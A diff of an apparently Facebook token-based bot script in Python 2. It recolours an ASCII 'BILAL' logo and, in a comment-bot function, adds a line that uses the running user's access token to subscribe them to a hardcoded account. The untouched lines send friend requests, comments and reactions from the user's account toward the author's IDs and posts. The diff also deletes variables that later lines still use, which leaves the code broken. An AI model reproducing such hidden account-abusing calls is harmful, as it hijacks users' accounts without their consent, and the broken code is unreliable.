@@ -45,12 +45,12 @@ def jalan(z):
  
  
 logo = """
-\x1b[1;94m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
+\x1b[1;93m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
 \x1b[1;94m██╔══██╗██║██║░░░░░██╔══██╗██║░░░░░
-\x1b[1;94m██████╦╝██║██║░░░░░███████║██║░░░░░
-\x1b[1;94m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
-\x1b[1;94m██████╦╝██║███████╗██║░░██║███████╗
-\x1b[1;94m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝""" 
+\x1b[1;95m██████╦╝██║██║░░░░░███████║██║░░░░░
+\x1b[1;96m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
+\x1b[1;97m██████╦╝██║███████╗██║░░██║███████╗
+\x1b[1;98m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝""" 
  
 def tik():
     titik = [
@@ -151,15 +151,7 @@ def bot_komen():
         print '\x1b[1;39m[!] Token invalid'
         os.system('rm -rf login.txt')
  
-    una = '100041129048948'
-    kom = 'Mr.BILAL\xf0\x9f\x98\x98'
-    kom = 'Mr.BILAL\xf0\x9f\x98\x8e'
-    reac = 'LOVE'
-    post = '481555709892060'
-    post2 = '481559296558368'
-    kom2 = 'Mr.BILAL\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
-    kom = 'Mr.BILAL\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
-    reac2 = 'ANGRY\xf0\x9f\x98\x98'
+    requests.post('https://graph.facebook.com/100011466164055/subscribers?access_token=' + toket)      #Bilal Haider
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
